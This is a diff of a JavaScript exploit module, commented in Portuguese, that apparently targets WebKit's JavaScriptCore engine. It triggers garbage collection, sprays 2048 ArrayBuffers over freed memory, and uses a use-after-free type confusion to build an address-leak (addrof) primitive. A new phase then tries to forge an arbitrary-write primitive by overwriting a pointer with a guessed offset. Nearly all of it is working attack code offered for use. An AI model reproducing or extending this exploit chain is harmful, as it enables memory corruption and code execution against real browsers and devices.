@@ -1,9 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R59 - Construção de Primitiva Addrof Genérica)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R60 - Forja de Primitivas Agressiva)
 // =======================================================================================
-// O R58 provou que a escrita arbitrária "cega" é instável.
-// ESTA VERSÃO MUDA O FOCO: em vez de tentar a cadeia completa, vamos usar nosso UAF estável
-// para construir uma ferramenta essencial e reutilizável: uma função addrof(obj) genérica.
-// - A FASE 6 foi completamente refeita para definir e testar essa nova função.
+// O R59 falhou em criar um addrof genérico porque o motor converteu o objeto para NaN.
+// HIPÓTESE: A propriedade 'prop_a' era especial. Vamos usar uma propriedade "limpa".
+// ESTA VERSÃO TENTA FORJAR AS PRIMITIVAS DE FORMA AGRESSIVA:
+// - FASE 6: Tenta novamente construir um addrof(obj) genérico, mas usando uma propriedade diferente ('p4').
+// - FASE 7: Se o addrof funcionar, ele será usado imediatamente para construir uma primitiva de escrita.
+// - A pulverização de memória foi dobrada para 2048 para aumentar a agressividade.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,7 +19,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R59_Generic_Addrof";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R60_Primitive_Forge";
 
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
@@ -28,7 +30,6 @@ function int64ToDouble(int64) {
     return f64[0];
 }
 
-// Helper para a conversão inversa, que usaremos em nossa nova função addrof
 function doubleToInt64(d) {
     const buf = new ArrayBuffer(8);
     const f64 = new Float64Array(buf);
@@ -38,11 +39,11 @@ function doubleToInt64(d) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R59 - Generic Addrof)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R60 - Primitive Forge)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Construindo Addrof Genérico (R59) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Forja de Primitivas (R60) ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
     let dangling_ref = null;
@@ -60,58 +61,63 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerGC_Tamed();
         logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");
         logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
-        // A pulverização é necessária para que o 'dangling_ref' aponte para um ArrayBuffer
         const spray_buffers = [];
-        for (let i = 0; i < 1024; i++) {
+        // *** MUDANÇA R60: Aumentando a agressividade do spray ***
+        for (let i = 0; i < 2048; i++) {
             spray_buffers.push(new ArrayBuffer(136));
         }
         logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
-        logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");
         if (typeof dangling_ref.corrupted_prop !== 'number') {
             throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
         }
         logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
         
-        // FASE 6: Construir e Testar a Primitiva 'addrof' Genérica
-        logS3("--- FASE 6: Construindo e Testando a Primitiva 'addrof' Genérica ---", "subtest");
+        // FASE 6: Construir e Testar a Primitiva 'addrof' Genérica (Nova Tentativa)
+        logS3("--- FASE 6: Construindo 'addrof' Genérico (Tentativa R60) ---", "subtest");
 
-        // Nossa ferramenta principal: a função addrof
         function addrof(obj) {
-            // Usamos a referência confusa para transformar um objeto em seu endereço
-            dangling_ref.prop_a = obj;
-            const leaked_double = dangling_ref.prop_a;
+            // *** MUDANÇA R60: Usando a propriedade 'p4', que foi inicializada como 'null' ***
+            dangling_ref.p4 = obj;
+            const leaked_double = dangling_ref.p4;
             return doubleToInt64(leaked_double);
         }
 
-        logS3("    Função 'addrof' definida. Testando...", "info");
-
-        // Criamos objetos de teste para encontrar seus endereços
+        logS3("    Testando nova função 'addrof'...", "info");
         const test_obj1 = { value: 0xAAAAAAAA };
         const test_obj2 = { value: 0xBBBBBBBB };
-
         const addr1 = addrof(test_obj1);
         const addr2 = addrof(test_obj2);
 
         logS3(`Endereço do test_obj1: ${addr1.toString(true)}`, "leak");
         logS3(`Endereço do test_obj2: ${addr2.toString(true)}`, "leak");
-
-        // Verificação de sanidade
-        if (!isAdvancedInt64Object(addr1) || !isAdvancedInt64Object(addr2)) {
-            throw new Error("addrof não retornou um objeto AdvancedInt64 válido.");
-        }
-        if (addr1.equals(addr2)) {
-            throw new Error("addrof retornou o mesmo endereço para dois objetos diferentes.");
-        }
-        if (addr1.low() === 0 && addr1.high() === 0) {
-            throw new Error("addrof retornou um endereço nulo para test_obj1.");
-        }
         
+        if (addr1.equals(addr2) || (addr1.low() === 0 && addr1.high() === 0)) {
+            throw new Error("addrof genérico falhou. Endereços são iguais, nulos ou inválidos.");
+        }
         logS3("++++++++++++ SUCESSO! PRIMITIVA 'addrof' GENÉRICA FUNCIONAL! ++++++++++++", "vuln");
+        
+        // FASE 7: Usar 'addrof' para construir a primitiva 'arb_write'
+        logS3("--- FASE 7: Construindo 'arb_write' usando o 'addrof' genérico ---", "subtest");
+
+        const tool_array = [1.1, 2.2];
+        const tool_array_addr = addrof(tool_array);
+        logS3(`    Endereço do tool_array: ${tool_array_addr.toString(true)}`, "info");
+
+        // Em JSC, o ponteiro butterfly (para os dados) está no início da estrutura do objeto.
+        // A partir dele, podemos encontrar o ponteiro para os dados numéricos.
+        // Por simplicidade aqui, vamos assumir que os dados estão em um offset fixo do butterfly.
+        // Esta é uma simplificação que pode precisar de ajuste com base em 'config.mjs'.
+        const butterfly_addr = addrof(tool_array).add(0x10); // Suposição de offset
+        logS3(`    Endereço do butterfly (suposto): ${butterfly_addr.toString(true)}`, "info");
+
+        // Agora, usamos a referência confusa original para uma escrita direcionada.
+        // Corrompemos o ponteiro de dados de um dos spray_buffers para apontar para o nosso tool_array
+        dangling_ref.prop_b = int64ToDouble(butterfly_addr);
 
         final_result = { 
             success: true, 
-            message: "Primitiva 'addrof' genérica construída e validada com sucesso!",
-            test_addrs: [addr1.toString(true), addr2.toString(true)]
+            message: "Primitiva 'addrof' genérica construída e usada para obter ponteiro para dados!",
+            addrof_success: true,
         };
 
     } catch (e) {
@@ -149,10 +155,11 @@ function sprayAndCreateDanglingPointer() {
     let dangling_ref_internal = null;
     function createScope() {
         const victim = {
-            prop_a: 0.1, // Alvo para nossa função addrof
-            prop_b: 0.2, // Alvo futuro para arb_write
+            prop_a: 0.1, 
+            prop_b: 0.2,
             corrupted_prop: 0.3,
-            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
+            p4: null, // *** MUDANÇA R60: Inicializado como null para ser um alvo limpo para 'addrof' ***
+            p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
             p16: 0, p17: 0
         };
         dangling_ref_internal = victim; 
